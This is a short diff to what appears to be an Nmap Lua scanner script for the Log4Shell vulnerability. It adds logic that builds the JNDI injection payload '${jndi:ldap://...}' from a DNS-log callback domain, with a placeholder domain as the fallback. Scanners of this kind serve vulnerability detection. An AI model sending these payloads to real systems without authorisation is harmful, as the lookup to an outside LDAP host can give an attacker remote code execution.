@@ -36,7 +36,17 @@ action = function(host, port)
 
   if not payload then
     if not gpayload then
-      payload = "${jndi:ldap://mydomain/uri}"
+      if nmap.registry['dnslog-cn'] then
+	 stdnse.debug2("registry not present")
+	 local registry = nmap.registry['dnslog-cn']
+	 if registry.domain then
+	       payload = "${jndi:ldap://{{target}}."..registry.domain.."}"
+	 else
+	       stdnse.debug2("session not present")
+	 end
+      else
+	 payload = "${jndi:ldap://mydomain/uri}"
+      end
       stdnse.debug1("Setting the payload to default payload:"..payload)
     else
       payload=gpayload
